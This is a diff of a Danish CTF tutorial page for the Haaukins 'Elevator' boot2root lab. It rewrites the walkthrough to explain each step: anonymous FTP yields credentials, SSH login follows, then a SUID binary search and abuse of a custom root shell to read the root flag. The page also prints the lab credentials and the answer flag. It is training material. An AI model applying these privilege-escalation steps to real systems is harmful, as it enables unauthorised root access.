@@ -22,17 +22,31 @@
 <div class="badges"><span class="badge cat">Boot2Root</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
-<h2>Trin for trin</h2>
-<pre><code>ftp anonymous@elevator.hkn            # credentials.txt (pablo:w0rk2bgr8)
-ssh pablo@elevator.hkn
-find / -perm -4000 -type f 2>/dev/null    # /usr/bin/rootshell/shell (custom)
-strings .../shell                     # setuid(0); system("/bin/bash")
-echo 'cat /root/flag.txt' | /usr/bin/rootshell/shell</code></pre>
+<h2>Sporet: samme foothold-mønster, en anden privesc</h2>
+<ol class="steps">
+<li><strong>Ingen creds udleveret</strong>, så scan efter en tjeneste du kan nå uden login. Som i
+<a href="escalator.html">Escalator</a> er anonym FTP åben og afleverer en credentials-fil:
+<pre><code>ftp anonymous@elevator.hkn    # credentials.txt: pablo / w0rk2bgr8
+ssh pablo@elevator.hkn</code></pre></li>
+<li><strong>Som bruger: led efter SUID-binære</strong> (det første privesc-tjek på Linux):
+<pre><code>find / -perm -4000 -type f 2>/dev/null   # /usr/bin/rootshell/shell  <- custom, ikke standard!</code></pre>
+En ikke-standard SUID-binær skiller sig ud fra den sædvanlige liste og er værd at undersøge først.</li>
+<li><strong>Reverse den for at forstå hvad den gør</strong> (<code>strings</code> rækker tit):
+<pre><code>strings /usr/bin/rootshell/shell   # setuid(0); system("/bin/bash")</code></pre>
+Det er bogstaveligt en bevidst root-shell. Kør den og fodr den en kommando:
+<pre><code>echo 'cat /root/flag.txt' | /usr/bin/rootshell/shell</code></pre></li>
+</ol>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flag: <span class="flag">HKN{p14t4_0_p10m0}</span></p>
 </details>
 <h2>Hvad du har lært</h2>
 <ul><li>Samme foothold-mønster som <a href="escalator.html">Escalator</a>, men privesc = en bevidst SUID root-shell.</li><li><code>setuid(0); system()</code> kører <code>/bin/bash</code> som root.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>En custom SUID-binær er altid værd at reverse'e: kør <code>strings</code> på den, for mange
+(som her) indeholder bogstaveligt <code>setuid(0); system("/bin/bash")</code> eller et kald til en
+anden kommando, og afslører dermed hvordan den giver root. Hjemmelavede SUID-helpers er en klassisk
+privesc i den virkelige verden netop fordi udviklere laver dem for at "gøre noget nemmere som
+root" og glemmer at de kan misbruges.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
